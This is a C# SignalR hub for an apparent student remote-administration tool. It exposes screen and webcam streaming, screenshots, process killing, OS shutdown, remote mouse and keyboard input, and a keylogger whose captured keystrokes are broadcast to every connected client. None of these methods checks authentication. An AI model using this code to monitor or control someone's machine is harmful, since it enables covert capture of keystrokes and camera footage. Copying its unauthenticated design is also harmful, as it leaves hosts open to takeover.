using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using server_os.Services;
using System.Collections.Concurrent;
using System.Text.Json.Serialization; // Để parse dữ liệu cuộn chuột

namespace server_os.Hubs
{
    // ==========================================
    // CÁC CLASS DATA
    // ==========================================
    public class ClientInfo
    {
        public string ConnectionId { get; set; } = "";
        public string IpAddress { get; set; } = "";
        public string Name { get; set; } = "";
    }

    public class VirtualCursor
    {
        public int X { get; set; }
        public int Y { get; set; }
        public string ClientId { get; set; } = "";
    }

    public class ScrollData
    {
        [JsonPropertyName("deltaY")]
        public double DeltaY { get; set; }
    }

    // ==========================================
    // MAIN HUB
    // ==========================================
    public class SystemHub : Hub
    {
        private readonly KeyloggerService _keylogger;
        private readonly SystemActionService _systemAction;
        private readonly WebcamService _webcamService;
        private readonly ScreenStreamService _screenService;
        private readonly InputControlService _inputService;
        private readonly IHostApplicationLifetime _appLifetime;
        private readonly IHubContext<SystemHub> _hubContext;

        private static ConcurrentDictionary<string, ClientInfo> _onlineClients = new ConcurrentDictionary<string, ClientInfo>();

        // Trạng thái hệ thống
        private static bool _isSystemLocked = false;
        private static bool _isScreenSharing = false;
        private static CancellationTokenSource? _screenShareToken;

        public SystemHub(
            KeyloggerService keylogger,
            SystemActionService systemAction,
            WebcamService webcamService,
            ScreenStreamService screenService,
            InputControlService inputService,
            IHostApplicationLifetime appLifetime,
            IHubContext<SystemHub> hubContext)
        {
            _keylogger = keylogger;
            _systemAction = systemAction;
            _webcamService = webcamService;
            _screenService = screenService;
            _inputService = inputService;
            _appLifetime = appLifetime;
            _hubContext = hubContext;
        }

        // ==========================================================
        // 1. ULTRAVIEWER (SCREEN SHARE)
        // ==========================================================
        public async Task StartScreenShare()
        {
            if (CheckLock()) return;
            if (_isScreenSharing) return;

            _isScreenSharing = true;
            _screenShareToken = new CancellationTokenSource();
            var token = _screenShareToken.Token;
            string currentClientId = Context.ConnectionId;

            // [LOG] Ghi lại hành động
            await LogAction("Started UltraView Screen Share");

            _ = Task.Run(async () =>
            {
                var stopwatch = new System.Diagnostics.Stopwatch();

                while (!token.IsCancellationRequested && _isScreenSharing)
                {
                    stopwatch.Restart();
                    try
                    {
                        var base64 = _screenService.CaptureScreenBase64();
                        if (!string.IsNullOrEmpty(base64))
                        {
                            await _hubContext.Clients.Client(currentClientId).SendAsync("ReceiveScreenFrame", base64);
                        }
                    }
                    catch { }

                    stopwatch.Stop();
                    // Limit ~30 FPS
                    int delay = Math.Max(0, 33 - (int)stopwatch.ElapsedMilliseconds);
                    await Task.Delay(delay);
                }
            }, token);
        }

        public async Task StopScreenShare()
        {
            _isScreenSharing = false;
            _screenShareToken?.Cancel();
            _inputService.ReleaseModifiers();

            // [LOG] Ghi lại hành động
            await LogAction("Stopped UltraView Screen Share");
        }

        // ==========================================================
        // 2. WEBCAM
        // ==========================================================
        public async Task GetWebcams()
        {
            if (CheckLock()) return;
            var list = _webcamService.GetCameraList();
            await Clients.Caller.SendAsync("ReceiveWebcamList", list);
        }

        public async Task StartWebcam(int camIndex)
        {
            if (CheckLock()) return;
            _webcamService.StartStream(camIndex, Context.ConnectionId);

            // [LOG]
            await LogAction($"Started Webcam Stream (Index: {camIndex})");
        }

        public async Task StopWebcam()
        {
            _webcamService.StopStream();

            // [LOG]
            await LogAction("Stopped Webcam Stream");
        }

        // ==========================================================
        // 3. SYSTEM ACTIONS (Screenshot, Process, Power)
        // ==========================================================
        public async Task TakeScreenshot()
        {
            if (_isSystemLocked) { await SendError("System Locked"); return; }

            var b64 = _systemAction.CaptureScreenToBase64();
            await Clients.Caller.SendAsync("ReceiveScreenshot", b64);

            // [LOG]
            await LogAction("Captured Screenshot");
        }

        public async Task GetProcesses()
        {
            if (!CheckLock())
            {
                await Clients.Caller.SendAsync("ReceiveProcessList", _systemAction.GetProcessList());
                // [LOG]
                await LogAction("Reloaded Process List");
            }
        }

        public async Task KillProcess(int pid)
        {
            if (!CheckLock()) await LogAction(_systemAction.KillProcess(pid));
        }

        public async Task StartApp(string name)
        {
            if (!CheckLock()) await LogAction(_systemAction.StartProcess(name));
        }

        public async Task ShutdownServer()
        {
            if (CheckLock()) return;
            await Clients.All.SendAsync("ServerStopping");
            await LogAction("Sent OS SHUTDOWN. Goodbye!");
            await Task.Delay(500);
            _systemAction.Shutdown();
        }

        public async Task RestartServer()
        {
            if (CheckLock()) return;
            await Clients.All.SendAsync("ServerStopping");
            await LogAction("Sent OS RESTART. See you soon!");
            await Task.Delay(500);
            _systemAction.Restart();
        }

        public async Task EmergencyShutdown()
        {
            await Clients.All.SendAsync("ServerStopping");
            await Clients.All.SendAsync("ReceiveLog", "[CRITICAL] EMERGENCY SHUTDOWN INITIATED...");
            await Task.Delay(500);
            _appLifetime.StopApplication();
        }

        public async Task ToggleSystemLock(bool isLocked)
        {
            _isSystemLocked = isLocked;
            await Clients.All.SendAsync("UpdateSystemStatus", _isSystemLocked);
            // [LOG]
            await LogAction($"System {(isLocked ? "LOCKED" : "UNLOCKED")}");
        }

        // ==========================================================
        // 4. KEYLOGGER
        // ==========================================================
        public async Task StartKeylog()
        {
            if (!CheckLock())
            {
                _keylogger.Start();
                await LogAction("Keylogger Started");
            }
        }

        public async Task StopKeylog()
        {
            if (!CheckLock())
            {
                _keylogger.Stop();
                var logs = _keylogger.GetLogs();
                await Clients.All.SendAsync("ReceiveKey", logs);
                await LogAction("Keylogger Stopped");
            }
        }

        // ==========================================================
        // 5. CLIENT REPORTING (Cho Client tự gửi log - Webcam Record)
        // ==========================================================
        public async Task ReportClientActivity(string msg)
        {
            await LogAction(msg);
        }

        // ==========================================================
        // 6. INPUT CONTROL
        // ==========================================================
        public Task RemoteMouseMove(int x, int y)
        {
            if (CheckLock()) return Task.CompletedTask;
            _inputService.MoveMouse(x, y);
            _ = Clients.All.SendAsync("UpdateVirtualCursor", new VirtualCursor { X = x, Y = y, ClientId = Context.ConnectionId });
            return Task.CompletedTask;
        }

        [HubMethodName("remote_scroll")]
        public Task RemoteScroll(ScrollData data)
        {
            if (CheckLock()) return Task.CompletedTask;
            _inputService.ScrollMouse((int)(-data.DeltaY));
            return Task.CompletedTask;
        }

        public Task RemoteMouseDown(string button)
        {
            if (!CheckLock()) _inputService.MouseDown(button);
            return Task.CompletedTask;
        }

        public Task RemoteMouseUp(string button)
        {
            if (!CheckLock()) _inputService.MouseUp(button);
            return Task.CompletedTask;
        }

        public Task RemoteMouseClick(string type)
        {
            if (CheckLock()) return Task.CompletedTask;
            if (type == "left") _inputService.ClickLeft();
            else if (type == "right") _inputService.ClickRight();
            return Task.CompletedTask;
        }

        public Task RemoteKeyDown(int keyCode)
        {
            if (!CheckLock()) _inputService.KeyDown((byte)keyCode);
            return Task.CompletedTask;
        }

        public Task RemoteKeyUp(int keyCode)
        {
            if (!CheckLock()) _inputService.KeyUp((byte)keyCode);
            return Task.CompletedTask;
        }

        public Task ResetKeys()
        {
            if (!CheckLock()) _inputService.ReleaseModifiers();
            return Task.CompletedTask;
        }

        // ==========================================================
        // 7. CONNECTION EVENTS & HELPERS
        // ==========================================================
        public override async Task OnConnectedAsync()
        {
            string id = Context.ConnectionId;
            string ip = GetIpAddress();
            string name = ip == "127.0.0.1" ? "HOST (DASHBOARD)" : $"CLIENT-{GetShortId(id)}";

            _onlineClients[id] = new ClientInfo { ConnectionId = id, IpAddress = ip, Name = name };

            await BroadcastClientList();
            await Clients.Caller.SendAsync("UpdateSystemStatus", _isSystemLocked);
            await Clients.All.SendAsync("ReceiveLog", $"[NET] Connected: {name} ({ip})");

            await base.OnConnectedAsync();
        }

        public override async Task OnDisconnectedAsync(Exception? exception)
        {
            string id = Context.ConnectionId;
            _webcamService.StopStream();

            if (_onlineClients.Count <= 1 && _isScreenSharing)
            {
                await StopScreenShare();
            }

            _onlineClients.TryRemove(id, out _);
            await BroadcastClientList();
            await Clients.All.SendAsync("ReceiveLog", $"[NET] Disconnected: {GetShortId(id)}");

            await base.OnDisconnectedAsync(exception);
        }

        private string GetIpAddress()
        {
            var ip = Context.GetHttpContext()?.Connection.RemoteIpAddress?.ToString();
            return (ip == "::1") ? "127.0.0.1" : (ip ?? "Unknown");
        }

        private string GetShortId(string id) => id.Length > 6 ? id[^6..] : id;

        private async Task BroadcastClientList() => await Clients.All.SendAsync("UpdateClientList", _onlineClients.Values.ToList());

        private bool CheckLock()
        {
            if (_isSystemLocked)
            {
                SendError("System is LOCKED.").Wait();
                return true;
            }
            return false;
        }

        private async Task LogAction(string msg)
        {
            string name = _onlineClients.TryGetValue(Context.ConnectionId, out var client) ? client.Name : "Unknown";
            await Clients.All.SendAsync("ReceiveLog", $"{name}: {msg}");
        }

        private async Task SendError(string msg) => await Clients.Caller.SendAsync("ReceiveLog", $"[BLOCKED] {msg}");
    }
}